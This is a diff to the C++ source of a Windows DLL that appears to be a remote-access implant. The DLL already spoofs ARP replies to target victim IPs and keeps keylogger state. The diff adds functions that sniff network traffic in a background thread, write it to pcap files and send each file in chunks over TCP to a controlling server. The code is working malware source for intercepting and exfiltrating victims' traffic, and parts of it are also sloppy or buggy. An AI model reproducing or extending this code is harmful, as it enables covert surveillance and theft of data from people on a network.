@@ -1,6 +1,7 @@
 ﻿#define _CRT_SECURE_NO_WARNINGS
 #include "Components.h"
 #include "arpspoof.h"
+#include "SniffTraffic.h"
 
 #define EXPORTING_DLL
 
@@ -9,6 +10,7 @@ vector<Arpspoof*> spoofvictims;
 vector<thread*> threads;
 string kl;
 bool storeKeys;
+std::atomic<bool> sniffanddump;
 
 BOOL APIENTRY DllMain(HMODULE hModule,
 	DWORD  ul_reason_for_call,
@@ -99,6 +101,19 @@ string SpoofVictim(std::string ip)
 	return "Spoof started";
 }
 
+string SniffCurrentTraffic(std::string filter)
+{
+	thread t(&SniffTrafficWithThread, filter);
+	t.detach();
+	return "SniffTraffic started";
+}
+
+string StopSniffTraffic(string nothing)
+{
+	sniffanddump = false;
+	return "sniffing stopped";
+}
+
 /*
 start spoofing a victim ip.
 create a spoofing object and add it to the spoofvictims vector
@@ -110,6 +125,86 @@ void SpoofVictimInThread(std::string ip)
 	Arpspoof a(ip);
 	spoofvictims.push_back(&a);
 	a.SendArpReplayForSpoofing(ip);
+}
+
+void SendFile(char * newFile)
+{
+	WSADATA wsadata;
+	SOCKET s = NULL;
+
+	int error = WSAStartup(MAKEWORD(2, 2), &wsadata);
+
+	//Did something happen?
+	if (error)
+		return;
+
+	//Did we get the right Winsock version?
+	if (wsadata.wVersion != 0x0202)
+	{
+		WSACleanup(); //Clean up Winsock
+		return;
+	}
+
+	//Fill out the information needed to initialize a socket�
+	addrinfo hints;
+	ZeroMemory(&hints, sizeof(hints));
+	hints.ai_family = AF_UNSPEC;
+	hints.ai_socktype = SOCK_STREAM;
+	hints.ai_protocol = IPPROTO_TCP;
+
+	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); //Create socket
+	if (s == INVALID_SOCKET)
+	{
+		return; //Couldn't create the socket
+	}
+
+	//Try connecting...
+	addrinfo *target;
+	error = getaddrinfo("127.0.0.1", "4921", &hints, &target);
+	connect(s, target->ai_addr, (int)target->ai_addrlen);
+
+	char remoteFILE[1024];
+	ifstream file_to_send;
+	file_to_send.open(newFile, std::ios::in | std::ios::binary);
+	file_to_send.seekg(0, std::ios::end);
+	long fileSIZE;
+	fileSIZE = file_to_send.tellg();
+	file_to_send.seekg(0, std::ios::beg);
+	file_to_send.seekg(8);
+	fileSIZE -= 8;
+	char* bufferCMP;
+	bufferCMP = (char*)malloc(sizeof(char) * fileSIZE);
+	file_to_send.read(bufferCMP, fileSIZE);
+	file_to_send.close();
+	int chunkcount = fileSIZE / 1023;
+	int lastchunksize = fileSIZE - (chunkcount * 1023);
+	int fileoffset = 0;
+	int iResult;
+
+	//Sending Actual Chunks
+	while (chunkcount > 0)
+	{
+		string message = string("7").append(bufferCMP + (fileoffset * 1023), 1023);
+		iResult = send(s, message.c_str(), 1024, 0);
+		fileoffset++;
+		chunkcount--;
+
+		if (iResult != 1024)
+		{
+			//printf("Sending Buffer size <> Default buffer length  ::: %d\n",WSAGetLastError());
+		}
+		else
+		{
+			//printf("Sending Buffer size = %d \n", iResult);
+		}
+		Sleep(100);
+	}
+
+	//Sending last Chunk
+	string message = string("7").append(bufferCMP + (fileoffset * 1023), 1023);
+	iResult = send(s, message.c_str(), 1024, 0);
+	message = string("7finish");
+	iResult = send(s, message.c_str(), message.size(), 0);
 }
 
 /*
@@ -315,6 +410,21 @@ string OpenSocketWithThread(std::string ip_and_port)
 	}
 
 	return string();
+}
+/*
+
+	sniff traffic and send the generated pcap file to the server
+	*/
+std::string SniffTrafficWithThread(std::string filter)
+{
+	sniffanddump = true;
+	while (sniffanddump)
+	{
+		SniffTraffic temp(filter.c_str(), 1000);
+		temp.Capture();
+		SendFile(temp.dumpfilename);
+	}
+
 }
 
 /*
